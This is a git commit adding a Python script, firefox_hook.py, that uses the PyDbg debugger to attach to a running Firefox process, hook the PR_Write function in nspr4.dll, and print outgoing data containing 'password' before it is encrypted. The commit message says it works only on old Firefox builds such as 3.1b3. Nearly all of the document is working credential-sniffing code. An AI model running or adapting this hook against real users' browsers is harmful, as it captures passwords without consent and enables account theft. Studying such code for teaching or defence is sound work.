6d5b6a534c6c6331b5cb013bcdc1512091e3d8ac
Grazfather <grazfather@gmail.com>
2015-03-14 19:05:56 -0700

    Add 'firefox_hook' to hook PR_Write to sniff unencrypted pws
    Works with older versions of firefox only (nspr4.dll doesn't seem to be
    a thing anymore).
    
    Tested with Firefox 3.1b3 available here:
    
    http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/3.1b3/win32/en-US/

---
+++ firefox_hook.py
@@ -0,0 +1,65 @@
+from pydbg import *
+from pydbg.defines import *
+
+import utils
+import sys
+
+dbg = pydbg()
+found_firefox = False
+
+# Let's set a global pattern that we can make the hook
+# search for
+pattern = "password"
+
+# This is our entry hook callback function
+# the argument we are interested in is args[1]
+def ssl_sniff(dbg, args):
+    # Now we read out the memory pointed to by the second argument
+    # it is stored as an ASCII string, so we'll loop on a read until
+    # we reach a NULL byte
+    buffer = ""
+    offset = 0
+
+    while 1:
+        byte = dbg.read_process_memory(args[1] + offset, 1)
+        if byte != "\x00":
+            buffer += byte
+            offset += 1
+            continue
+        else:
+            break
+
+    if pattern in buffer:
+        print "Pre-Encrypted: %s" % buffer
+
+    return DBG_CONTINUE
+
+# Quick and dirty process enumeration to find firefox.exe
+for (pid, name) in dbg.enumerate_processes():
+    if name.lower() == "firefox.exe":
+        found_firefox = True
+        hooks = utils.hook_container()
+
+        dbg.attach(pid)
+        print "[*] Attaching to firefox.exe with PID: %d" % pid
+
+        # Resolve the function address
+        hook_address = dbg.func_resolve_debuggee("nspr4.dll", "PR_Write")
+
+        if hook_address:
+            # Add the hook to the container. We aren't interested
+            # in using an exist callback, so we set it to None.
+            hooks.add(dbg, hook_address, 2, ssl_sniff, None)
+            print "[*] nspr.PR_Write hooked at: 0x%08x" % hook_address
+            break
+        else:
+            print "[*] Error: Couldn't resolve hook address."
+            sys.exit(-1)
+
+if found_firefox:
+    print "[*] Hooks set, continuing process."
+    dbg.run()
+else:
+    print "[*] Error: Couldn't find the firefox.exe process."
+    sys.exit(-1)
+
